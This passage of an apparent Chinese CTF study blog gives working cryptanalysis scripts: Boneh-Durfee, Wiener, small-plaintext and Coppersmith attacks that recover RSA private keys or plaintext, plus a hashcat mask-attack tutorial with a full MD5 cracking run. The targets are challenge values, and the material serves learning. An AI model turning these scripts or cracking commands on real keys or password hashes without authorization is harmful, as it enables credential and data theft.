class="line">            <span class="comment"># are these good polynomials?</span></span><br><span class="line">            <span class="keyword">if</span> rr.is_zero() <span class="keyword">or</span> rr.monomials() == [<span class="number">1</span>]:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span> (<span class="string">&quot;found them, using vectors&quot;</span>, pol1_idx, <span class="string">&quot;and&quot;</span>, pol2_idx)</span><br><span class="line">                found_polynomials = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> found_polynomials:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> found_polynomials:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;no independant vectors could be found. This should very rarely happen...&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    rr = rr(q, q)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># solutions</span></span><br><span class="line">    soly = rr.roots()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(soly) == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;Your prediction (delta) is too small&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    soly = soly[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">    ss = pol1(q, soly)</span><br><span class="line">    solx = ss.roots()[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="keyword">return</span> solx, soly</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">example</span>():</span><br><span class="line">    <span class="comment">############################################</span></span><br><span class="line">    <span class="comment"># How To Use This Script</span></span><br><span class="line">    <span class="comment">##########################################</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># The problem to solve (edit the following values)</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># the modulus</span></span><br><span class="line">    N = <span class="number">97814568264814384858194701955408461509880555772006698372422205341758322175891474378211599333051180365254844248340812534463000531890490435018379585036704801177155418066770861143206836558793774360498040810255823235715535487716966004194143204900564413879660115112965484824906920141847149888933004740523449213441</span></span><br><span class="line">    <span class="comment"># the public exponent</span></span><br><span class="line">    e = <span class="number">93943500165298065499950418373429723509334252629406924973909070866091749987346174290549648466771963135864917881154270768788129489671486923171733460927672763251885052132144244633336183737015936611716827476566876619327956203686756399730968768494676888428137426449681845021696056187478027217734766494935085365973</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># the hypothesis on the private exponent (the theoretical maximum is 0.292)</span></span><br><span class="line">    delta = <span class="number">0.280</span> <span class="comment"># this means that d &lt; N^delta</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># Lattice (tweak those values)</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># you should tweak this (after a first run), (e.g. increment it until a solution is found)</span></span><br><span class="line">    m = <span class="number">4</span> <span class="comment"># size of the lattice (bigger the better/slower)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># you need to be a lattice master to tweak these</span></span><br><span class="line">    t = <span class="built_in">int</span>((<span class="number">1</span>-<span class="number">2</span>*delta) * m)  <span class="comment"># optimization from Herrmann and May</span></span><br><span class="line">    X = <span class="number">2</span>*floor(N^delta)  <span class="comment"># this _might_ be too much</span></span><br><span class="line">    Y = floor(N^(<span class="number">1</span>/<span class="number">2</span>))    <span class="comment"># correct if p, q are ~ same size</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># Don&#x27;t touch anything below</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Problem put in equation</span></span><br><span class="line">    P.&lt;x,y&gt; = PolynomialRing(ZZ)</span><br><span class="line">    A = <span class="built_in">int</span>((N+<span class="number">1</span>)/<span class="number">2</span>)</span><br><span class="line">    pol = <span class="number">1</span> + x * (A + y)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># Find the solutions!</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Checking bounds</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;=== checking values ===&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;* delta:&quot;</span>, delta)</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;* delta &lt; 0.292&quot;</span>, delta &lt; <span class="number">0.292</span>)</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;* size of e:&quot;</span>, <span class="built_in">int</span>(log(e)/log(<span class="number">2</span>)))</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;* size of N:&quot;</span>, <span class="built_in">int</span>(log(N)/log(<span class="number">2</span>)))</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;* m:&quot;</span>, m, <span class="string">&quot;, t:&quot;</span>, t)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># boneh_durfee</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;=== running algorithm ===&quot;</span>)</span><br><span class="line">        start_time = time.time()</span><br><span class="line"></span><br><span class="line">    solx, soly = boneh_durfee(pol, e, m, t, X, Y)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># found a solution?</span></span><br><span class="line">    <span class="keyword">if</span> solx &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;=== solution found ===&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="literal">False</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;x:&quot;</span>, solx)</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;y:&quot;</span>, soly)</span><br><span class="line"></span><br><span class="line">        d = <span class="built_in">int</span>(pol(solx, soly) / e)</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;private key found:&quot;</span>, d)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;=== no solution was found ===&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;=== %s seconds ===&quot;</span> % (time.time() - start_time))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    example() </span><br></pre></td></tr></table></figure></div>

<h2 id="维纳攻击"><a href="#维纳攻击" class="headerlink" title="维纳攻击"></a>维纳攻击</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">transform</span>(<span class="params">x,y</span>):       <span class="comment">#使用辗转相处将分数 x/y 转为连分数的形式</span></span><br><span class="line">    res=[]</span><br><span class="line">    <span class="keyword">while</span> y:</span><br><span class="line">        res.append(x//y)</span><br><span class="line">        x,y=y,x%y</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">continued_fraction</span>(<span class="params">sub_res</span>):</span><br><span class="line">    numerator,denominator=<span class="number">1</span>,<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> sub_res[::-<span class="number">1</span>]:      <span class="comment">#从sublist的后面往前循环</span></span><br><span class="line">        denominator,numerator=numerator,i*numerator+denominator</span><br><span class="line">    <span class="keyword">return</span> denominator,numerator   <span class="comment">#得到渐进分数的分母和分子，并返回</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment">#求解每个渐进分数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sub_fraction</span>(<span class="params">x,y</span>):</span><br><span class="line">    res=transform(x,y)</span><br><span class="line">    res=<span class="built_in">list</span>(<span class="built_in">map</span>(continued_fraction,(res[<span class="number">0</span>:i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>(res)))))  <span class="comment">#将连分数的结果逐一截取以求渐进分数</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_pq</span>(<span class="params">a,b,c</span>):      <span class="comment">#由p+q和pq的值通过维达定理来求解p和q</span></span><br><span class="line">    par=gmpy2.isqrt(b*b-<span class="number">4</span>*a*c)   <span class="comment">#由上述可得，开根号一定是整数，因为有解</span></span><br><span class="line">    x1,x2=(-b+par)//(<span class="number">2</span>*a),(-b-par)//(<span class="number">2</span>*a)</span><br><span class="line">    <span class="keyword">return</span> x1,x2</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">wienerAttack</span>(<span class="params">e,n</span>):</span><br><span class="line">    <span class="keyword">for</span> (d,k) <span class="keyword">in</span> sub_fraction(e,n):  <span class="comment">#用一个for循环来注意试探e/n的连续函数的渐进分数，直到找到一个满足条件的渐进分数</span></span><br><span class="line">        <span class="keyword">if</span> k==<span class="number">0</span>:                     <span class="comment">#可能会出现连分数的第一个为0的情况，排除</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> (e*d-<span class="number">1</span>)%k!=<span class="number">0</span>:             <span class="comment">#ed=1 (mod φ(n)) 因此如果找到了d的话，(ed-1)会整除φ(n),也就是存在k使得(e*d-1)//k=φ(n)</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        </span><br><span class="line">        phi=(e*d-<span class="number">1</span>)//k               <span class="comment">#这个结果就是 φ(n)</span></span><br><span class="line">        px,qy=get_pq(<span class="number">1</span>,n-phi+<span class="number">1</span>,n)</span><br><span class="line">        <span class="keyword">if</span> px*qy==n:</span><br><span class="line">            p,q=<span class="built_in">abs</span>(<span class="built_in">int</span>(px)),<span class="built_in">abs</span>(<span class="built_in">int</span>(qy))     <span class="comment">#可能会得到两个负数，负负得正未尝不会出现</span></span><br><span class="line">            d=gmpy2.invert(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))     <span class="comment">#求ed=1 (mod  φ(n))的结果，也就是e关于 φ(n)的乘法逆元d</span></span><br><span class="line">            <span class="keyword">return</span> d</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;该方法不适用&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">e = <span class="number">14058695417015334071588010346586749790539913287499707802938898719199384604316115908373997739604466972535533733290829894940306314501336291780396644520926473</span></span><br><span class="line">n = <span class="number">33608051123287760315508423639768587307044110783252538766412788814888567164438282747809126528707329215122915093543085008547092423658991866313471837522758159</span></span><br><span class="line">d=wienerAttack(e,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;d=&quot;</span>,d)`</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>Crypto</category>
        <category>RSA</category>
      </categories>
  </entry>
  <entry>
    <title>pem解析</title>
    <url>/2024/03/30/Crypto/RSA/pem%E8%A7%A3%E6%9E%90/</url>
    <content><![CDATA[<p><a class="link"   href="https://tover.xyz/p/pem-by-hand/" >手撕PEM密钥（RSA） | Tover’s Blog <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>Crypto</category>
        <category>RSA</category>
      </categories>
  </entry>
  <entry>
    <title>sieve_base</title>
    <url>/2024/07/31/Crypto/RSA/sieve_base/</url>
    <content><![CDATA[<p>[<a class="link"   href="https://blog.csdn.net/shshss64/article/details/127171266" >NCTF2019]childRSA（费马定理）-CSDN博客 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>Crypto</category>
        <category>RSA</category>
      </categories>
  </entry>
  <entry>
    <title>复数域上的计算</title>
    <url>/2024/06/29/Crypto/RSA/%E5%A4%8D%E6%95%B0%E5%9F%9F%E4%B8%8A%E7%9A%84%E8%AE%A1%E7%AE%97/</url>
    <content><![CDATA[<p><a class="link"   href="https://blog.csdn.net/XiongSiqi_blog/article/details/134742341" >complex_复数域rsa-CSDN博客 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>Crypto</category>
        <category>RSA</category>
      </categories>
  </entry>
  <entry>
    <title>小明文攻击</title>
    <url>/2023/07/15/Crypto/RSA/%E5%B0%8F%E6%98%8E%E6%96%87%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<p>小明文攻击的要求是e足够小</p>
<p>因为存在这个关系</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">m^e=c mod n</span><br><span class="line">所以有</span><br><span class="line">m^e=k*n + c  k为整数</span><br><span class="line">m  = (k*n+c)^(1/e)</span><br></pre></td></tr></table></figure></div>

<p>同时因为e足够小所以k足够小，可以通过穷举k来获得明文m</p>
<p>exp:</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> e <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">5</span>):<span class="comment">#遍历e,已知e可以不用遍历</span></span><br><span class="line">	<span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2000</span>):<span class="comment">#遍历k</span></span><br><span class="line">		<span class="keyword">import</span> Crypto.Util.number</span><br><span class="line">			<span class="keyword">if</span> <span class="built_in">__import__</span>(<span class="string">&quot;gmpy2&quot;</span>).iroot((k*n+flag),e)[<span class="number">1</span>]:</span><br><span class="line">				<span class="keyword">if</span> <span class="string">b&quot;NSSCTF&quot;</span> <span class="keyword">in</span> Crypto.Util.number.long_to_bytes(<span class="built_in">__import__</span>(<span class="string">&quot;gmpy2&quot;</span>).iroot((k*n+flag),e)[<span class="number">0</span>]):<span class="comment">#条件判断</span></span><br><span class="line">					<span class="built_in">print</span>(Crypto.Util.number.long_to_bytes(<span class="built_in">__import__</span>(<span class="string">&quot;gmpy2&quot;</span>).iroot((k*n+flag),e)[<span class="number">0</span>]))</span><br></pre></td></tr></table></figure></div>

<p>[<a class="link"   href="https://www.nssctf.cn/problem/417" >SWPUCTF 2021 新生赛]crypto5 | NSSCTF <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line">flag= <span class="number">25166751653530941364839663846806543387720865339263370907985655775152187319464715737116599171477207047430065345882626259880756839094179627032623895330242655333</span></span><br><span class="line">n= <span class="number">134109481482703713214838023035418052567000870587160796935708584694132507394211363652420160931185332280406437290210512090663977634730864032370977407179731940068634536079284528020739988665713200815021342700369922518406968356455736393738946128013973643235228327971170711979683931964854563904980669850660628561419</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2000</span>):</span><br><span class="line">	<span class="keyword">import</span> Crypto.Util.number</span><br><span class="line">	<span class="keyword">for</span> e <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">5</span>):</span><br><span class="line">		<span class="keyword">if</span> <span class="built_in">__import__</span>(<span class="string">&quot;gmpy2&quot;</span>).iroot((k*n+flag),e)[<span class="number">1</span>]:</span><br><span class="line">			<span class="keyword">if</span> <span class="string">b&quot;NSSCTF&quot;</span> <span class="keyword">in</span> Crypto.Util.number.long_to_bytes(<span class="built_in">__import__</span>(<span class="string">&quot;gmpy2&quot;</span>).iroot((k*n+flag),e)[<span class="number">0</span>]):</span><br><span class="line">				<span class="built_in">print</span>(Crypto.Util.number.long_to_bytes(<span class="built_in">__import__</span>(<span class="string">&quot;gmpy2&quot;</span>).iroot((k*n+flag),e)[<span class="number">0</span>]))</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>Crypto</category>
        <category>RSA</category>
      </categories>
  </entry>
  <entry>
    <title>Coppersmith</title>
    <url>/2023/09/17/Crypto/sage/Coppersmith/</url>
    <content><![CDATA[<p>例子</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># p = getPrime(512)</span></span><br><span class="line"><span class="comment"># q = getPrime(512)</span></span><br><span class="line"><span class="comment"># n = p * q</span></span><br><span class="line"><span class="comment"># e = 65537</span></span><br><span class="line"><span class="comment"># leak = p &gt;&gt; 230</span></span><br><span class="line"><span class="comment"># m = bytes_to_long(flag)</span></span><br><span class="line"><span class="comment"># c = pow(m,e,n)</span></span><br><span class="line"><span class="comment"># print(n)</span></span><br><span class="line"><span class="comment"># print(leak)</span></span><br><span class="line"><span class="comment"># print(c)</span></span><br><span class="line"> </span><br><span class="line">n = <span class="number">114007680041157617250208809154392208683967639953423906669116998085115503737001019559692895227927818755160444076128820965038044269092587109196557720941716578025622244634385547194563001079609897387390680250570961313174656874665690193604984942452581886657386063927035039087208310041149977622001887997061312418381</span></span><br><span class="line">leak = <span class="number">6833525680083767201563383553257365403889275861180069149272377788671845720921410137177</span></span><br><span class="line">c = <span class="number">87627846271126693177889082381507430884663777705438987267317070845965070209704910716182088690758208915234427170455157948022843849997441546596567189456637997191173043345521331111329110083529853409188141263211030032553825858341099759209550785745319223409181813931086979471131074015406202979668575990074985441810</span></span><br><span class="line"></span><br><span class="line">PR = PolynomialRing(Zmod(n),<span class="string">&#x27;x&#x27;</span>)<span class="comment">#此处创建了一个变量为x的环(用于求解方程的范围)</span></span><br><span class="line">x = PR.gen()<span class="comment">#将环内变量赋值给x</span></span><br><span class="line"></span><br><span class="line">f = (leak&lt;&lt;<span class="number">230</span>) +x</span><br><span class="line">v = f.monic().small_roots(X=<span class="number">2</span>**<span class="number">230</span>, beta=<span class="number">0.4</span>, epsilon=<span class="number">0.02</span>)<span class="comment">#epsilon为精度 一般越高越好 不设置可能会出错 X为求解范围一般越接近你需要求的p缺失的位数越好 此处用**用^会出现异或与指数混淆</span></span><br><span class="line">p = <span class="built_in">int</span>(f(v[<span class="number">0</span>]))</span><br><span class="line">m = <span class="built_in">pow</span>(c, inverse_mod(<span class="number">65537</span>, (p-<span class="number">1</span>)),p)</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(m)))</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>Crypto</category>
        <category>sage</category>
      </categories>
  </entry>
  <entry>
    <title>Sagemath</title>
    <url>/2023/07/18/Crypto/sage/Sagemath/</url>
    <content><![CDATA[<h2 id="基本编程环境配置"><a href="#基本编程环境配置" class="headerlink" title="基本编程环境配置"></a>基本编程环境配置</h2><p>可以通过wsl apt包管理器安装sagemath</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install sagemath</span><br></pre></td></tr></table></figure></div>

<p>再在windows中vscode安装wsl插件连接wsl，再在扩展中安装python插件</p>
<p>将python路径设置为sage-python的路径 即可在windows中即时编译运行</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202307182231531.png"
                      alt="image-20230718223137438"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202307182231043.png"
                      alt="image-20230718223114951"
                ></p>
<h2 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h2>]]></content>
      <categories>
        <category>Crypto</category>
        <category>sage</category>
      </categories>
  </entry>
  <entry>
    <title>two_squre</title>
    <url>/2024/06/22/Crypto/sage/two_squre/</url>
    <content><![CDATA[<p>two_squares(n)</p>
<blockquote>
<p>类似p^2+q^2的问题求解</p>
<p>可化成复数域的平方差</p>
<p>(p-iq)*(p+iq)</p>
</blockquote>
]]></content>
      <categories>
        <category>Crypto</category>
        <category>sage</category>
      </categories>
  </entry>
  <entry>
    <title>hashcat</title>
    <url>/2023/07/18/Crypto/%E6%8A%80%E5%B7%A7%E5%8F%8A%E5%B7%A5%E5%85%B7/hashcat/</url>
    <content><![CDATA[<p><a class="link"   href="https://hashcat.net/hashcat/" >hashcat - advanced password recovery <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>也可以通过</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">pip install hashcat</span><br></pre></td></tr></table></figure></div>

<p>nvidia需要cuda kit支持</p>
<h2 id="常用hash模式标识符"><a href="#常用hash模式标识符" class="headerlink" title="常用hash模式标识符"></a>常用hash模式标识符</h2><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">-m 0 	#MD5</span><br><span class="line">-m 100 	#SHA1</span><br><span class="line">-m 1400 #SHA256</span><br><span class="line">-m 1700	#SHA512</span><br><span class="line">-m 3200	#bcrypt</span><br><span class="line">-m 1000 #NTLm</span><br><span class="line">-m 400	#WordPress</span><br><span class="line">-m 300	#MySQL</span><br></pre></td></tr></table></figure></div>

<h2 id="常用攻击模式"><a href="#常用攻击模式" class="headerlink" title="常用攻击模式"></a>常用攻击模式</h2><h3 id="字典攻击"><a href="#字典攻击" class="headerlink" title="字典攻击"></a>字典攻击</h3><p>根据字典内值进行暴力搜索</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">-a 0 -m hash模式标识符 待破解hash 字典</span><br></pre></td></tr></table></figure></div>

<h3 id="组合攻击"><a href="#组合攻击" class="headerlink" title="组合攻击"></a>组合攻击</h3><p>组合多个字典值进行猜测</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-a 1 -m hash模式标识符 待破解hash 后可跟多个字典</span><br></pre></td></tr></table></figure></div>

<h3 id="掩码攻击"><a href="#掩码攻击" class="headerlink" title="掩码攻击"></a>掩码攻击</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-a 3 -m hash模式标识符 待破解hash 带掩码字符串</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">?a	任意字符</span><br><span class="line">?H	大写16进制字符</span><br><span class="line">?h	小写16进制字符</span><br><span class="line">?d	数字字符</span><br><span class="line">?u	大写字母</span><br><span class="line">?l	小写字符</span><br><span class="line">?s	特殊字符</span><br><span class="line">?b	一字节内所有字符</span><br></pre></td></tr></table></figure></div>

<h4 id="自定义掩码字符集"><a href="#自定义掩码字符集" class="headerlink" title="自定义掩码字符集"></a>自定义掩码字符集</h4><blockquote>
<p>hsahcat -a 3 -m hash模式标识符 待破解hash -1 “字符集地址 “ 带掩码字符串</p>
</blockquote>
<p>可以使用-w 线程数	来使用多线程</p>
<p>其余用法可见hashcat -help</p>
<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>[<a class="link"   href="https://www.nssctf.cn/problem/3971" >LitCTF 2023]md5的破解 | NSSCTF <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="comment">#flag全是由小写字母及数字组成</span></span><br><span class="line">m=md5(flag).hexdigest()</span><br><span class="line"><span class="built_in">print</span>(flag[:<span class="number">13</span>]+flag[<span class="number">15</span>:<span class="number">18</span>]+flag[<span class="number">19</span>:<span class="number">34</span>]+flag[<span class="number">35</span>:<span class="number">38</span>])</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="comment"># b&#x27;LitCTF&#123;md5can3derypt213thoughcrsh&#125;&#x27;</span></span><br><span class="line"><span class="comment"># 496603d6953a15846cd7cc476f146771</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>给了一部分字符和字符串的hash值可以通过hashcat掩码进行求值</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">hashcat -a 3 -m 0 496603d6953a15846cd7cc476f146771 LitCTF&#123;md5can?a?a3de?arypt213thoughcr?ash&#125;</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">hashcat -a 3 -m 0 496603d6953a15846cd7cc476f146771 LitCTF&#123;md5can?a?a3de?arypt213thoughcr?ash&#125;</span><br><span class="line">hashcat (v6.2.5) starting</span><br><span class="line"></span><br><span class="line">* Device #1: WARNING! Kernel exec timeout is not disabled.</span><br><span class="line">             This may cause &quot;CL_OUT_OF_RESOURCES&quot; or related errors.</span><br><span class="line">             To disable the timeout, see: https://hashcat.net/q/timeoutpatch</span><br><span class="line">* Device #2: WARNING! Kernel exec timeout is not disabled.</span><br><span class="line">             This may cause &quot;CL_OUT_OF_RESOURCES&quot; or related errors.</span><br><span class="line">             To disable the timeout, see: https://hashcat.net/q/timeoutpatch</span><br><span class="line">nvmlDeviceGetFanSpeed(): Not Supported</span><br><span class="line"></span><br><span class="line">CUDA API (CUDA 12.2)</span><br><span class="line">====================</span><br><span class="line">* Device #1: NVIDIA GeForce RTX 3060 Laptop GPU, 5135/6143 MB, 30MCU</span><br><span class="line"></span><br><span class="line">OpenCL API (OpenCL 3.0 CUDA 12.2.79) - Platform #1 [NVIDIA Corporation]</span><br><span class="line">=======================================================================</span><br><span class="line">* Device #2: NVIDIA GeForce RTX 3060 Laptop GPU, skipped</span><br><span class="line"></span><br><span class="line">Minimum password length supported by kernel: 0</span><br><span class="line">Maximum password length supported by kernel: 256</span><br><span class="line"></span><br><span class="line">Hashes: 1 digests; 1 unique digests, 1 unique salts</span><br><span class="line">Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates</span><br><span class="line"></span><br><span class="line">Optimizers applied:</span><br><span class="line">* Zero-Byte</span><br><span class="line">* Early-Skip</span><br><span class="line">* Not-Salted</span><br><span class="line">* Not-Iterated</span><br><span class="line">* Single-Hash</span><br><span class="line">* Single-Salt</span><br><span class="line">* Brute-Force</span><br><span class="line">* Raw-Hash</span><br><span class="line"></span><br><span class="line">ATTENTION! Pure (unoptimized) backend kernels selected.</span><br><span class="line">Pure kernels can crack longer passwords, but drastically reduce performance.</span><br><span class="line">If you want to switch to optimized kernels, append -O to your commandline.</span><br><span class="line">See the above message to find out about the exact limits.</span><br><span class="line"></span><br><span class="line">Watchdog: Temperature abort trigger set to 90c</span><br><span class="line"></span><br><span class="line">Host memory required for this attack: 1473 MB</span><br><span class="line"></span><br><span class="line">496603d6953a15846cd7cc476f146771:LitCTF&#123;md5can123dexrypt213thoughcrpsh&#125;</span><br></pre></td></tr></table></figure></div>

<p>在最后hash值冒号后就是破解出的值</p>
]]></content>
      <categories>
        <category>Crypto</category>
        <category>技巧及工具</category>
      </categories>
  </entry>
  <entry>
    <title>密钥交换协定</title>
    <url>/2023/10/04/Crypto/%E6%8A%80%E5%B7%A7%E5%8F%8A%E5%B7%A5%E5%85%B7/%E5%AF%86%E9%92%A5%E4%BA%A4%E6%8D%A2%E5%8D%8F%E5%AE%9A/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>Crypto</category>
        <category>技巧及工具</category>
      </categories>
  </entry>
  <entry>
    <title>randcrack</title>
    <url>/2023/09/21/Crypto/%E6%8A%80%E5%B7%A7%E5%8F%8A%E5%B7%A5%E5%85%B7/randcrack/</url>
    <content><![CDATA[<p>利用随机数漏洞预测随机数</p>
<p>参考[<a class="link"   href="https://blog.csdn.net/qq_42557115/article/details/128228201" >CTF&#x2F;randcrack]python随机数预测模块分析及改进方案_ctf 随机数_虚空guoql的博客-CSDN博客 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>Crypto</category>
        <category>技巧及工具</category>
      </categories>
  </entry>
  <entry>
    <title>index1</title>
    <url>/2024/07/31/Crypto/%E5%BE%85%E5%AD%A6/index1/</url>
